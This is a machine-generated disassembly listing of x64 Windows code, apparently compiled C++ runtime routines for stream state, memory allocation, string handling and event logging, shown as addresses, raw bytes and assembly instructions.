   140002d4e:	eb 1a                	jmp    0x140002d6a
   140002d50:	bd 04 00 00 00       	mov    $0x4,%ebp
   140002d55:	eb 25                	jmp    0x140002d7c
   140002d57:	49 8b 00             	mov    (%r8),%rax
   140002d5a:	41 8b d1             	mov    %r9d,%edx
   140002d5d:	49 8b c8             	mov    %r8,%rcx
   140002d60:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002d64:	ff 15 56 16 06 00    	call   *0x61656(%rip)        # 0x1400643c0
   140002d6a:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002d6d:	74 0a                	je     0x140002d79
   140002d6f:	48 ff cb             	dec    %rbx
   140002d72:	48 85 db             	test   %rbx,%rbx
   140002d75:	7f 99                	jg     0x140002d10
   140002d77:	eb 03                	jmp    0x140002d7c
   140002d79:	83 cd 04             	or     $0x4,%ebp
   140002d7c:	48 8b 07             	mov    (%rdi),%rax
   140002d7f:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002d83:	48 c7 44 39 28 00 00 	movq   $0x0,0x28(%rcx,%rdi,1)
   140002d8a:	00 00 
   140002d8c:	48 8b 07             	mov    (%rdi),%rax
   140002d8f:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002d93:	48 03 cf             	add    %rdi,%rcx
   140002d96:	45 33 c0             	xor    %r8d,%r8d
   140002d99:	8b d5                	mov    %ebp,%edx
   140002d9b:	e8 a0 8d 00 00       	call   0x14000bb40
   140002da0:	90                   	nop
   140002da1:	48 8b 07             	mov    (%rdi),%rax
   140002da4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002da8:	83 7c 39 10 00       	cmpl   $0x0,0x10(%rcx,%rdi,1)
   140002dad:	75 35                	jne    0x140002de4
   140002daf:	f6 44 39 18 02       	testb  $0x2,0x18(%rcx,%rdi,1)
   140002db4:	74 2e                	je     0x140002de4
   140002db6:	48 8b 4c 39 48       	mov    0x48(%rcx,%rdi,1),%rcx
   140002dbb:	48 8b 01             	mov    (%rcx),%rax
   140002dbe:	48 8b 40 68          	mov    0x68(%rax),%rax
   140002dc2:	ff 15 f8 15 06 00    	call   *0x615f8(%rip)        # 0x1400643c0
   140002dc8:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002dcb:	75 17                	jne    0x140002de4
   140002dcd:	48 8b 07             	mov    (%rdi),%rax
   140002dd0:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002dd4:	48 03 cf             	add    %rdi,%rcx
   140002dd7:	45 33 c0             	xor    %r8d,%r8d
   140002dda:	41 8d 50 04          	lea    0x4(%r8),%edx
   140002dde:	e8 5d 8d 00 00       	call   0x14000bb40
   140002de3:	90                   	nop
   140002de4:	48 8b 07             	mov    (%rdi),%rax
   140002de7:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002deb:	48 8b 4c 39 48       	mov    0x48(%rcx,%rdi,1),%rcx
   140002df0:	48 85 c9             	test   %rcx,%rcx
   140002df3:	74 0e                	je     0x140002e03
   140002df5:	48 8b 01             	mov    (%rcx),%rax
   140002df8:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002dfc:	ff 15 be 15 06 00    	call   *0x615be(%rip)        # 0x1400643c0
   140002e02:	90                   	nop
   140002e03:	48 8b c7             	mov    %rdi,%rax
   140002e06:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140002e0b:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140002e10:	48 83 c4 30          	add    $0x30,%rsp
   140002e14:	41 5e                	pop    %r14
   140002e16:	5f                   	pop    %rdi
   140002e17:	5e                   	pop    %rsi
   140002e18:	c3                   	ret
   140002e19:	cc                   	int3
   140002e1a:	cc                   	int3
   140002e1b:	cc                   	int3
   140002e1c:	cc                   	int3
   140002e1d:	cc                   	int3
   140002e1e:	cc                   	int3
   140002e1f:	cc                   	int3
   140002e20:	48 83 ec 28          	sub    $0x28,%rsp
   140002e24:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140002e2b:	72 30                	jb     0x140002e5d
   140002e2d:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140002e31:	48 3b c1             	cmp    %rcx,%rax
   140002e34:	76 3f                	jbe    0x140002e75
   140002e36:	0f ae e8             	lfence
   140002e39:	48 8b c8             	mov    %rax,%rcx
   140002e3c:	e8 e7 93 03 00       	call   0x14003c228
   140002e41:	48 8b c8             	mov    %rax,%rcx
   140002e44:	48 85 c0             	test   %rax,%rax
   140002e47:	74 32                	je     0x140002e7b
   140002e49:	0f ae e8             	lfence
   140002e4c:	48 83 c0 27          	add    $0x27,%rax
   140002e50:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   140002e54:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140002e58:	48 83 c4 28          	add    $0x28,%rsp
   140002e5c:	c3                   	ret
   140002e5d:	48 85 c9             	test   %rcx,%rcx
   140002e60:	74 0c                	je     0x140002e6e
   140002e62:	0f ae e8             	lfence
   140002e65:	48 83 c4 28          	add    $0x28,%rsp
   140002e69:	e9 ba 93 03 00       	jmp    0x14003c228
   140002e6e:	33 c0                	xor    %eax,%eax
   140002e70:	48 83 c4 28          	add    $0x28,%rsp
   140002e74:	c3                   	ret
   140002e75:	e8 66 7c 00 00       	call   0x14000aae0
   140002e7a:	cc                   	int3
   140002e7b:	e8 c0 fe 03 00       	call   0x140042d40
   140002e80:	cc                   	int3
   140002e81:	cc                   	int3
   140002e82:	cc                   	int3
   140002e83:	cc                   	int3
   140002e84:	cc                   	int3
   140002e85:	cc                   	int3
   140002e86:	cc                   	int3
   140002e87:	cc                   	int3
   140002e88:	cc                   	int3
   140002e89:	cc                   	int3
   140002e8a:	cc                   	int3
   140002e8b:	cc                   	int3
   140002e8c:	cc                   	int3
   140002e8d:	cc                   	int3
   140002e8e:	cc                   	int3
   140002e8f:	cc                   	int3
   140002e90:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002e95:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002e9a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002e9f:	41 56                	push   %r14
   140002ea1:	48 83 ec 20          	sub    $0x20,%rsp
   140002ea5:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   140002eac:	ff ff 7f 
   140002eaf:	49 8b f8             	mov    %r8,%rdi
   140002eb2:	48 8b ea             	mov    %rdx,%rbp
   140002eb5:	4c 8b f1             	mov    %rcx,%r14
   140002eb8:	4c 3b c6             	cmp    %rsi,%r8
   140002ebb:	77 7d                	ja     0x140002f3a
   140002ebd:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   140002ec4:	00 
   140002ec5:	49 83 f8 10          	cmp    $0x10,%r8
   140002ec9:	73 0b                	jae    0x140002ed6
   140002ecb:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140002ecf:	e8 fc a4 03 00       	call   0x14003d3d0
   140002ed4:	eb 4e                	jmp    0x140002f24
   140002ed6:	48 8b c7             	mov    %rdi,%rax
   140002ed9:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002ede:	48 83 c8 0f          	or     $0xf,%rax
   140002ee2:	48 3b c6             	cmp    %rsi,%rax
   140002ee5:	77 0f                	ja     0x140002ef6
   140002ee7:	b9 16 00 00 00       	mov    $0x16,%ecx
   140002eec:	48 8b f0             	mov    %rax,%rsi
   140002eef:	48 3b c1             	cmp    %rcx,%rax
   140002ef2:	48 0f 42 f1          	cmovb  %rcx,%rsi
   140002ef6:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   140002efa:	e8 21 ff ff ff       	call   0x140002e20
   140002eff:	4c 8b c7             	mov    %rdi,%r8
   140002f02:	49 89 06             	mov    %rax,(%r14)
   140002f05:	48 8b d5             	mov    %rbp,%rdx
   140002f08:	49 89 7e 10          	mov    %rdi,0x10(%r14)
   140002f0c:	48 8b c8             	mov    %rax,%rcx
   140002f0f:	49 89 76 18          	mov    %rsi,0x18(%r14)
   140002f13:	48 8b d8             	mov    %rax,%rbx
   140002f16:	e8 b5 a4 03 00       	call   0x14003d3d0
   140002f1b:	c6 04 3b 00          	movb   $0x0,(%rbx,%rdi,1)
   140002f1f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002f24:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002f29:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002f2e:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140002f33:	48 83 c4 20          	add    $0x20,%rsp
   140002f37:	41 5e                	pop    %r14
   140002f39:	c3                   	ret
   140002f3a:	e8 31 7c 00 00       	call   0x14000ab70
   140002f3f:	cc                   	int3
   140002f40:	48 3b ca             	cmp    %rdx,%rcx
   140002f43:	74 78                	je     0x140002fbd
   140002f45:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002f4a:	57                   	push   %rdi
   140002f4b:	48 83 ec 20          	sub    $0x20,%rsp
   140002f4f:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140002f54:	48 8b fa             	mov    %rdx,%rdi
   140002f57:	33 f6                	xor    %esi,%esi
   140002f59:	48 8b d9             	mov    %rcx,%rbx
   140002f5c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002f60:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140002f64:	48 83 fa 10          	cmp    $0x10,%rdx
   140002f68:	72 2c                	jb     0x140002f96
   140002f6a:	48 8b 0b             	mov    (%rbx),%rcx
   140002f6d:	48 ff c2             	inc    %rdx
   140002f70:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002f77:	72 18                	jb     0x140002f91
   140002f79:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140002f7d:	48 83 c2 27          	add    $0x27,%rdx
   140002f81:	49 2b c8             	sub    %r8,%rcx
   140002f84:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140002f88:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002f8c:	77 30                	ja     0x140002fbe
   140002f8e:	49 8b c8             	mov    %r8,%rcx
   140002f91:	e8 ce 92 03 00       	call   0x14003c264
   140002f96:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   140002f9a:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140002fa1:	00 
   140002fa2:	40 88 33             	mov    %sil,(%rbx)
   140002fa5:	48 83 c3 20          	add    $0x20,%rbx
   140002fa9:	48 3b df             	cmp    %rdi,%rbx
   140002fac:	75 b2                	jne    0x140002f60
   140002fae:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140002fb3:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140002fb8:	48 83 c4 20          	add    $0x20,%rsp
   140002fbc:	5f                   	pop    %rdi
   140002fbd:	c3                   	ret
   140002fbe:	e8 7d fd 03 00       	call   0x140042d40
   140002fc3:	cc                   	int3
   140002fc4:	cc                   	int3
   140002fc5:	cc                   	int3
   140002fc6:	cc                   	int3
   140002fc7:	cc                   	int3
   140002fc8:	cc                   	int3
   140002fc9:	cc                   	int3
   140002fca:	cc                   	int3
   140002fcb:	cc                   	int3
   140002fcc:	cc                   	int3
   140002fcd:	cc                   	int3
   140002fce:	cc                   	int3
   140002fcf:	cc                   	int3
   140002fd0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002fd5:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140002fda:	57                   	push   %rdi
   140002fdb:	41 54                	push   %r12
   140002fdd:	41 57                	push   %r15
   140002fdf:	48 83 ec 20          	sub    $0x20,%rsp
   140002fe3:	48 8b 01             	mov    (%rcx),%rax
   140002fe6:	4c 8b fa             	mov    %rdx,%r15
   140002fe9:	48 8b 79 08          	mov    0x8(%rcx),%rdi
   140002fed:	4d 8b e0             	mov    %r8,%r12
   140002ff0:	48 2b f8             	sub    %rax,%rdi
   140002ff3:	4c 2b f8             	sub    %rax,%r15
   140002ff6:	48 c1 ff 05          	sar    $0x5,%rdi
   140002ffa:	49 b8 ff ff ff ff 48 	movabs $0x245c8948ffffffff,%r8
   140003001:	89 5c 24 
   140003004:	08 48 89             	or     %cl,-0x77(%rax)
   140003007:	74 24                	je     0x14000302d
   140003009:	18 55 57             	sbb    %dl,0x57(%rbp)
   14000300c:	41 54                	push   %r12
   14000300e:	41 56                	push   %r14
   140003010:	41 57                	push   %r15
   140003012:	48 8d 6c 24 f9       	lea    -0x7(%rsp),%rbp
   140003017:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   14000301e:	48 8b 05 8b 0f 04 00 	mov    0x40f8b(%rip),%rax        # 0x140043fb0
   140003025:	48 33 c4             	xor    %rsp,%rax
   140003028:	48 89 45 f7          	mov    %rax,-0x9(%rbp)
   14000302c:	48 8b 8d 8f 00 00 00 	mov    0x8f(%rbp),%rcx
   140003033:	4c 8b e2             	mov    %rdx,%r12
   140003036:	83 65 f3 00          	andl   $0x0,-0xd(%rbp)
   14000303a:	48 8b 85 97 00 00 00 	mov    0x97(%rbp),%rax
   140003041:	4c 8b 7d 67          	mov    0x67(%rbp),%r15
   140003045:	48 8b 39             	mov    (%rcx),%rdi
   140003048:	4c 8b 75 6f          	mov    0x6f(%rbp),%r14
   14000304c:	48 8b 75 77          	mov    0x77(%rbp),%rsi
   140003050:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   140003054:	c7 45 ef 04 00 00 00 	movl   $0x4,-0x11(%rbp)
   14000305b:	48 85 ff             	test   %rdi,%rdi
   14000305e:	74 11                	je     0x140003071
   140003060:	48 8b cf             	mov    %rdi,%rcx
   140003063:	e8 08 e4 02 00       	call   0x140031470
   140003068:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000306d:	03 c3                	add    %ebx,%eax
   14000306f:	eb 0e                	jmp    0x14000307f
   140003071:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003076:	48 8d 3d 83 84 03 00 	lea    0x38483(%rip),%rdi        # 0x14003b500
   14000307d:	8b c3                	mov    %ebx,%eax
   14000307f:	83 65 e3 00          	andl   $0x0,-0x1d(%rbp)
   140003083:	83 65 d3 00          	andl   $0x0,-0x2d(%rbp)
   140003087:	83 65 c3 00          	andl   $0x0,-0x3d(%rbp)
   14000308b:	89 45 df             	mov    %eax,-0x21(%rbp)
   14000308e:	48 8b 85 87 00 00 00 	mov    0x87(%rbp),%rax
   140003095:	48 89 7d d7          	mov    %rdi,-0x29(%rbp)
   140003099:	48 8b 3e             	mov    (%rsi),%rdi
   14000309c:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   1400030a0:	48 8b 45 7f          	mov    0x7f(%rbp),%rax
   1400030a4:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   1400030a8:	89 5d cf             	mov    %ebx,-0x31(%rbp)
   1400030ab:	c7 45 bf 04 00 00 00 	movl   $0x4,-0x41(%rbp)
   1400030b2:	48 85 ff             	test   %rdi,%rdi
   1400030b5:	74 0c                	je     0x1400030c3
   1400030b7:	48 8b cf             	mov    %rdi,%rcx
   1400030ba:	e8 b1 e3 02 00       	call   0x140031470
   1400030bf:	03 c3                	add    %ebx,%eax
   1400030c1:	eb 09                	jmp    0x1400030cc
   1400030c3:	48 8d 3d 36 84 03 00 	lea    0x38436(%rip),%rdi        # 0x14003b500
   1400030ca:	8b c3                	mov    %ebx,%eax
   1400030cc:	83 65 b3 00          	andl   $0x0,-0x4d(%rbp)
   1400030d0:	48 89 7d a7          	mov    %rdi,-0x59(%rbp)
   1400030d4:	49 8b 3e             	mov    (%r14),%rdi
   1400030d7:	89 45 af             	mov    %eax,-0x51(%rbp)
   1400030da:	48 85 ff             	test   %rdi,%rdi
   1400030dd:	74 0c                	je     0x1400030eb
   1400030df:	48 8b cf             	mov    %rdi,%rcx
   1400030e2:	e8 89 e3 02 00       	call   0x140031470
   1400030e7:	03 c3                	add    %ebx,%eax
   1400030e9:	eb 09                	jmp    0x1400030f4
   1400030eb:	48 8d 3d 0e 84 03 00 	lea    0x3840e(%rip),%rdi        # 0x14003b500
   1400030f2:	8b c3                	mov    %ebx,%eax
   1400030f4:	83 65 a3 00          	andl   $0x0,-0x5d(%rbp)
   1400030f8:	48 89 7d 97          	mov    %rdi,-0x69(%rbp)
   1400030fc:	49 8b 3f             	mov    (%r15),%rdi
   1400030ff:	89 45 9f             	mov    %eax,-0x61(%rbp)
   140003102:	48 85 ff             	test   %rdi,%rdi
   140003105:	74 0c                	je     0x140003113
   140003107:	48 8b cf             	mov    %rdi,%rcx
   14000310a:	e8 61 e3 02 00       	call   0x140031470
   14000310f:	03 c3                	add    %ebx,%eax
   140003111:	eb 09                	jmp    0x14000311c
   140003113:	48 8d 3d e6 83 03 00 	lea    0x383e6(%rip),%rdi        # 0x14003b500
   14000311a:	8b c3                	mov    %ebx,%eax
   14000311c:	83 65 93 00          	andl   $0x0,-0x6d(%rbp)
   140003120:	48 8d 0d 89 01 04 00 	lea    0x40189(%rip),%rcx        # 0x1400432b0
   140003127:	83 65 83 00          	andl   $0x0,-0x7d(%rbp)
   14000312b:	45 33 c9             	xor    %r9d,%r9d
   14000312e:	83 64 24 5c 00       	andl   $0x0,0x5c(%rsp)
   140003133:	45 33 c0             	xor    %r8d,%r8d
   140003136:	89 45 8f             	mov    %eax,-0x71(%rbp)
   140003139:	49 8b d4             	mov    %r12,%rdx
   14000313c:	48 8b 45 5f          	mov    0x5f(%rbp),%rax
   140003140:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003145:	48 8b 45 57          	mov    0x57(%rbp),%rax
   140003149:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000314e:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140003153:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003158:	c7 44 24 20 0b 00 00 	movl   $0xb,0x20(%rsp)
   14000315f:	00 
   140003160:	48 89 7d 87          	mov    %rdi,-0x79(%rbp)
   140003164:	89 5c 24 68          	mov    %ebx,0x68(%rsp)
   140003168:	c7 44 24 58 08 00 00 	movl   $0x8,0x58(%rsp)
   14000316f:	00 
   140003170:	e8 67 02 00 00       	call   0x1400033dc
   140003175:	48 8b 4d f7          	mov    -0x9(%rbp),%rcx
   140003179:	48 33 cc             	xor    %rsp,%rcx
   14000317c:	e8 cf 61 00 00       	call   0x140009350
   140003181:	4c 8d 9c 24 f0 00 00 	lea    0xf0(%rsp),%r11
   140003188:	00 
   140003189:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000318d:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140003191:	49 8b e3             	mov    %r11,%rsp
   140003194:	41 5f                	pop    %r15
   140003196:	41 5e                	pop    %r14
   140003198:	41 5c                	pop    %r12
   14000319a:	5f                   	pop    %rdi
   14000319b:	5d                   	pop    %rbp
   14000319c:	c3                   	ret
   14000319d:	cc                   	int3
   14000319e:	cc                   	int3
   14000319f:	cc                   	int3
   1400031a0:	48 8b c4             	mov    %rsp,%rax
   1400031a3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400031a7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400031ab:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400031af:	55                   	push   %rbp
   1400031b0:	41 54                	push   %r12
   1400031b2:	41 55                	push   %r13
   1400031b4:	41 56                	push   %r14
   1400031b6:	41 57                	push   %r15
   1400031b8:	48 8d 68 b8          	lea    -0x48(%rax),%rbp
   1400031bc:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
   1400031c3:	48 8b 05 e6 0d 04 00 	mov    0x40de6(%rip),%rax        # 0x140043fb0
   1400031ca:	48 33 c4             	xor    %rsp,%rax
   1400031cd:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1400031d1:	48 8b 85 80 00 00 00 	mov    0x80(%rbp),%rax
   1400031d8:	bf 02 00 00 00       	mov    $0x2,%edi
   1400031dd:	4c 8b ad 88 00 00 00 	mov    0x88(%rbp),%r13
   1400031e4:	4c 8b a5 90 00 00 00 	mov    0x90(%rbp),%r12
   1400031eb:	4c 8b bd a8 00 00 00 	mov    0xa8(%rbp),%r15
   1400031f2:	4c 8b b5 b0 00 00 00 	mov    0xb0(%rbp),%r14
   1400031f9:	48 8b b5 b8 00 00 00 	mov    0xb8(%rbp),%rsi
   140003200:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140003205:	48 8b 85 c0 00 00 00 	mov    0xc0(%rbp),%rax
   14000320c:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140003211:	48 8b 18             	mov    (%rax),%rbx
   140003214:	48 85 db             	test   %rbx,%rbx
   140003217:	74 11                	je     0x14000322a
   140003219:	48 8b cb             	mov    %rbx,%rcx
   14000321c:	e8 bb 11 00 00       	call   0x1400043dc
   140003221:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003228:	eb 09                	jmp    0x140003233
   14000322a:	48 8d 1d d3 82 03 00 	lea    0x382d3(%rip),%rbx        # 0x14003b504
   140003231:	8b cf                	mov    %edi,%ecx
   140003233:	83 65 0c 00          	andl   $0x0,0xc(%rbp)
   140003237:	48 89 5d 00          	mov    %rbx,0x0(%rbp)
   14000323b:	48 8b 1e             	mov    (%rsi),%rbx
   14000323e:	33 f6                	xor    %esi,%esi
   140003240:	89 4d 08             	mov    %ecx,0x8(%rbp)
   140003243:	48 85 db             	test   %rbx,%rbx
   140003246:	74 11                	je     0x140003259
   140003248:	48 8b cb             	mov    %rbx,%rcx
   14000324b:	e8 8c 11 00 00       	call   0x1400043dc
   140003250:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003257:	eb 09                	jmp    0x140003262
   140003259:	48 8d 1d a4 82 03 00 	lea    0x382a4(%rip),%rbx        # 0x14003b504
   140003260:	8b cf                	mov    %edi,%ecx
   140003262:	48 89 5d f0          	mov    %rbx,-0x10(%rbp)
   140003266:	49 8b 1e             	mov    (%r14),%rbx
   140003269:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   14000326c:	89 75 fc             	mov    %esi,-0x4(%rbp)
   14000326f:	48 85 db             	test   %rbx,%rbx
   140003272:	74 11                	je     0x140003285
   140003274:	48 8b cb             	mov    %rbx,%rcx
   140003277:	e8 60 11 00 00       	call   0x1400043dc
   14000327c:	8d 3c 45 02 00 00 00 	lea    0x2(,%rax,2),%edi
   140003283:	eb 07                	jmp    0x14000328c
   140003285:	48 8d 1d 78 82 03 00 	lea    0x38278(%rip),%rbx        # 0x14003b504
   14000328c:	89 7d e8             	mov    %edi,-0x18(%rbp)
   14000328f:	4c 8d 35 6a 82 03 00 	lea    0x3826a(%rip),%r14        # 0x14003b500
   140003296:	49 8b 3f             	mov    (%r15),%rdi
   140003299:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   14000329d:	89 75 ec             	mov    %esi,-0x14(%rbp)
   1400032a0:	48 85 ff             	test   %rdi,%rdi
   1400032a3:	74 11                	je     0x1400032b6
   1400032a5:	48 8b cf             	mov    %rdi,%rcx
   1400032a8:	e8 c3 e1 02 00       	call   0x140031470
   1400032ad:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400032b2:	03 c3                	add    %ebx,%eax
   1400032b4:	eb 0a                	jmp    0x1400032c0
   1400032b6:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400032bb:	49 8b fe             	mov    %r14,%rdi
   1400032be:	8b c3                	mov    %ebx,%eax
   1400032c0:	89 45 d8             	mov    %eax,-0x28(%rbp)
   1400032c3:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   1400032ca:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
   1400032ce:	49 8b 3c 24          	mov    (%r12),%rdi
   1400032d2:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   1400032d6:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   1400032dd:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   1400032e1:	89 75 dc             	mov    %esi,-0x24(%rbp)
   1400032e4:	48 c7 45 c8 01 00 00 	movq   $0x1,-0x38(%rbp)
   1400032eb:	00 
   1400032ec:	48 c7 45 b8 04 00 00 	movq   $0x4,-0x48(%rbp)
   1400032f3:	00 
   1400032f4:	48 85 ff             	test   %rdi,%rdi
   1400032f7:	74 0c                	je     0x140003305
   1400032f9:	48 8b cf             	mov    %rdi,%rcx
   1400032fc:	e8 6f e1 02 00       	call   0x140031470
   140003301:	03 c3                	add    %ebx,%eax
   140003303:	eb 05                	jmp    0x14000330a
   140003305:	49 8b fe             	mov    %r14,%rdi
   140003308:	8b c3                	mov    %ebx,%eax
   14000330a:	48 89 7d a0          	mov    %rdi,-0x60(%rbp)
   14000330e:	49 8b 7d 00          	mov    0x0(%r13),%rdi
   140003312:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140003315:	89 75 ac             	mov    %esi,-0x54(%rbp)
   140003318:	48 85 ff             	test   %rdi,%rdi
   14000331b:	74 0c                	je     0x140003329
   14000331d:	48 8b cf             	mov    %rdi,%rcx
   140003320:	e8 4b e1 02 00       	call   0x140031470
   140003325:	03 c3                	add    %ebx,%eax
   140003327:	eb 05                	jmp    0x14000332e
   140003329:	49 8b fe             	mov    %r14,%rdi
   14000332c:	8b c3                	mov    %ebx,%eax
   14000332e:	48 89 7d 90          	mov    %rdi,-0x70(%rbp)
   140003332:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140003337:	89 45 98             	mov    %eax,-0x68(%rbp)
   14000333a:	89 75 9c             	mov    %esi,-0x64(%rbp)
   14000333d:	48 8b 3f             	mov    (%rdi),%rdi
   140003340:	48 85 ff             	test   %rdi,%rdi
   140003343:	74 0c                	je     0x140003351
   140003345:	48 8b cf             	mov    %rdi,%rcx
   140003348:	e8 23 e1 02 00       	call   0x140031470
   14000334d:	03 c3                	add    %ebx,%eax
   14000334f:	eb 05                	jmp    0x140003356
   140003351:	49 8b fe             	mov    %r14,%rdi
   140003354:	8b c3                	mov    %ebx,%eax
   140003356:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000335b:	48 8d 0d 4e ff 03 00 	lea    0x3ff4e(%rip),%rcx        # 0x1400432b0
   140003362:	89 45 88             	mov    %eax,-0x78(%rbp)
   140003365:	45 33 c9             	xor    %r9d,%r9d
   140003368:	48 8b 45 78          	mov    0x78(%rbp),%rax
   14000336c:	45 33 c0             	xor    %r8d,%r8d
   14000336f:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003374:	48 8b 45 70          	mov    0x70(%rbp),%rax
   140003378:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000337d:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140003382:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003387:	c7 44 24 20 0d 00 00 	movl   $0xd,0x20(%rsp)
   14000338e:	00 
   14000338f:	48 89 7d 80          	mov    %rdi,-0x80(%rbp)
   140003393:	89 75 8c             	mov    %esi,-0x74(%rbp)
   140003396:	48 c7 44 24 78 01 00 	movq   $0x1,0x78(%rsp)
   14000339d:	00 00 
   14000339f:	48 c7 44 24 68 08 00 	movq   $0x8,0x68(%rsp)
   1400033a6:	00 00 
   1400033a8:	e8 2f 00 00 00       	call   0x1400033dc
   1400033ad:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   1400033b1:	48 33 cc             	xor    %rsp,%rcx
   1400033b4:	e8 97 5f 00 00       	call   0x140009350
   1400033b9:	4c 8d 9c 24 20 01 00 	lea    0x120(%rsp),%r11
   1400033c0:	00 
   1400033c1:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400033c5:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400033c9:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   1400033cd:	49 8b e3             	mov    %r11,%rsp
   1400033d0:	41 5f                	pop    %r15
   1400033d2:	41 5e                	pop    %r14
   1400033d4:	41 5d                	pop    %r13
   1400033d6:	41 5c                	pop    %r12
   1400033d8:	5d                   	pop    %rbp
   1400033d9:	c3                   	ret
   1400033da:	cc                   	int3
   1400033db:	cc                   	int3
   1400033dc:	48 83 ec 48          	sub    $0x48,%rsp
   1400033e0:	0f b6 02             	movzbl (%rdx),%eax
   1400033e3:	4c 8b d9             	mov    %rcx,%r11
   1400033e6:	c1 e0 18             	shl    $0x18,%eax
   1400033e9:	4d 8b d0             	mov    %r8,%r10
   1400033ec:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   1400033f1:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400033f5:	0f b7 42 01          	movzwl 0x1(%rdx),%eax
   1400033f9:	89 44 24 34          	mov    %eax,0x34(%rsp)
   1400033fd:	48 8b 42 03          	mov    0x3(%rdx),%rax
   140003401:	48 83 c2 0b          	add    $0xb,%rdx
   140003405:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000340a:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000340e:	49 89 00             	mov    %rax,(%r8)
   140003411:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140003415:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   14000341a:	0f b7 08             	movzwl (%rax),%ecx
   14000341d:	41 89 48 08          	mov    %ecx,0x8(%r8)
   140003421:	48 8d 0d 98 a7 03 00 	lea    0x3a798(%rip),%rcx        # 0x14003dbc0
   140003428:	49 89 50 10          	mov    %rdx,0x10(%r8)
   14000342c:	41 c7 40 0c 02 00 00 	movl   $0x2,0xc(%r8)
   140003433:	00 
   140003434:	0f b7 02             	movzwl (%rdx),%eax
   140003437:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000343c:	41 89 40 18          	mov    %eax,0x18(%r8)
